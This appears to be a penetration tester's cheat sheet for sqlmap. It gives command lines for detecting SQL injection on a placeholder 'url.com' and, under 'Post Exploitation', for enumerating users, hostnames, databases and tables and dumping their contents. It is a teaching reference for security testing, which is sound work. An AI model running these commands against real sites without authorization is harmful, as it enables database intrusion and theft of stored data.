## Scope 
Automatic SQL injection and database takeover tool.

SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over-data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.

## Source
https://github.com/sqlmapproject/sqlmap

Environment:  Python

## Installation
*Pre-installed in Kali Linux

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

# Example Usages

### To get a list of basic options and switches
```
python sqlmap.py -h
```

### To get a list of all options and switches
```
python sqlmap.py -hh
```

### Vulnerability Finding

### ALL IN ONE
```
sqlmap -u url.com --threads 5 --level 5 --risk 3 --v 1 --batch
```
 
### Auto Select default features
```
sqlmap -u url.com/news.php?id=1 --batch
```

### Crawling the URL 
```
sqlmap -u url.com --crawl depth --batch
```

### Union attack

```
sqlmap -u url.com --crawl 5 --technique="U" --batch
```

### Thread >> using multiple connections for faster results, default 1, [range= 1 to 10]
```
sqlmap -u url.com --crawl 5 --threads [1 to 10] --batch
```
 
### Risk >> harm level of payloads used, default 1, [range=1 to 3]

```
sqlmap -u url.com --crawl 5 --risk 3
```

### Level >> test in the cookies; default 1, [range=1 to 5]

```
sqlmap -u url.com --crawl 5 --level 5
```

### Verbosity , default 0,[range=0 to 6]
```
sqlmap -u url.com --crawl 5 --batch --v 6
```

## Post Exploitation

### User Enumeration; after finding a vulnerable parameter

```
sqlmap -u url.com/news.php?id=1 --current-user --batch
```

```
sqlmap -u url.com/news.php?id=1 --hostname --batch
```

### Getting the current database name
```
sqlmap -u url.com/news.php?id=1 --current-db --batch
```


### Getting tables in a database
```
sqlmap -u url.com/news.php?id=1 -D database_name --tables
```

### Getting All columns in a table
```
sqlmap -u url.com/news.php?id=1 -D database_name -T table_name --dump
```

### Getting a specific Column Type in a specific table
```
sqlmap -u url.com/news.php?id=1 -D database_name -T table_name --columns
```

### Getting all tables in a database
```
sqlmap -u url.com/news.php?id=1 -D database_name --dump-all
```

### Getting all database details
```
sqlmap -u url.com/news.php?id=1 --dbs
```

### <mark style="background: #D2B3FFA6;">Saving Output</mark>

```
sqlmap -u url.com --crawl 5 --output-dir="/location/to/save.txt"
```

